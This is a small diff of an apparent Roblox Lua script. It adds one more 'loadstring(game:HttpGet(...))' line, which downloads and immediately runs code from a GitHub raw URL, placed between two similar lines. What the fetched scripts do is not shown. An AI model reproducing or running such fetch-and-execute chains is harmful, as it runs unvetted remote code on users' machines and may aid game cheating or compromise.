@@ -445,10 +445,10 @@ coroutine.wrap(HZWNR_fake_script)()
 
 
 
-
-
 wait(3)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/1GrayArea"))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/2Whitescreen"))()
 wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/3rafa"))()
 wait(10)
